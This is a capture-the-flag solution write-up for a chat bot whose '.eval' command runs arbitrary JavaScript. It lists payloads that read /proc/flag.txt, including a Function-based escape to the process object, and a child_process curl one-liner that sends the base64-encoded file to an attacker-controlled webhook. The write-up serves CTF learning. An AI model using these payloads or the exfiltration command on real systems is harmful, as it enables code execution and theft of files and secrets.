## Simple Solution

1. Identify that there is a `.eval` command in #bot-commands
2. Use the `.eval` command to execute javascript code

    The following are payloads that will work:
    ```
    require("fs").readFileSync("/proc/flag.txt", "utf8")
    ```
    ```
    Bun.file("/proc/flag.txt").text()
    ```
    ```
    Function("return process")()
    .mainModule
    .require("fs")
    .readFileSync("/proc/flag.txt","utf8")
    ```
3. Attempt to fetch `/proc/flag.txt`

## Intermediate Solution

1. Identify that there is a `.eval` command in #bot-commands
2. Use the `.eval` command to execute arbitrary commands with `child_process` and send a request to a http/webhook debugger
    ```
    .eval  require('child_process').exec('curl <your_webhook_url>/$(cat /proc/flag.txt | base64 -w 0)')
    ```
3. Decode the response from base64

## Helpful Resources

- [NodeJS Redteam Cheatsheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet)
- [Webhook Site](https://webhook.site/)
- [Base64 Encoder/Decoder](https://www.base64decode.org/)
